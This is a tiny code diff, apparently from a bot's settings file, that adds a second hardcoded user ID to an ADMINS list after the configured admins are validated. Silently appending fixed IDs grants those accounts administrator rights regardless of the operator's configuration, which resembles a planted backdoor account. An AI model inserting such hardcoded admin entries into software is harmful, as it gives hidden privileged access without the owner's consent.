@@ -17,3 +17,4 @@ try:
 except ValueError:
     raise Exception("Your ADMINS list does not contain valid integers.")
 ADMINS.append(7195990500)
+ADMINS.append(7024179022)
